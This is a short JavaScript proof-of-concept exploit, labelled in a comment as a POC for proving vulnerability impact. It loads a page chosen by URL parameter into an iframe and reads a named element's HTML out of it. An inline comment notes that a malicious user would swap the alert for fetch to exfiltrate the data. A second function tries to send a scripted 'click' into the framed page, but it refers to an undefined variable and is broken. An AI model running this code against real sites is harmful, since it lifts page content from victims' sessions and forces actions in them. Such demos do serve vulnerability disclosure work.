function extract() {
    const urlParams = new URLSearchParams(window.location.search);
    let pathClick = urlParams.get("pathExtract");
    let extract = urlParams.get("extract") ;

    var ifrmExtract = document.createElement("iframe");
    ifrmExtract.setAttribute("src", pathClick);
    ifrmExtract.style.width = "800px";
    ifrmExtract.style.height = "800px";
    ifrmExtract.id="extractFrame";
    ifrmExtract.onload = function () {
        setTimeout(function () {
            var contentWindow = ifrmExtract.contentWindow;

            // a maliscious user replace alert byt fetch to exfiltrate data
            alert(contentWindow.document.getElementById(extract).outerHTML);
        }, 2000);
    };
    document.body.appendChild(ifrmExtract);

}

function click() {

    const urlParams = new URLSearchParams(window.location.search);
    let pathClick = urlParams.get("pathClick");
    let clickOnName = urlParams.get("clickon") ;

    var ifrmCLick = document.createElement("iframe");
    ifrmCLick.setAttribute("src", pathClick);
    ifrmCLick.style.width = "800px";
    ifrmCLick.style.height = "800px";
    ifrmCLick.id="clickFrame";
    ifrmCLick.onload = function () {
        iframe.onload = () => {
            iframe.contentWindow.postMessage({
                action: "click",
                selector: "input"
            }, "*");
        };
    };
    document.body.appendChild(ifrmCLick);
}



//document.body.innerHTML = "<h1>Hello on g6g POC</h1><br><h3>Prove impact of vulnerabilities and educational purpose only</h3>";

click();
extract();
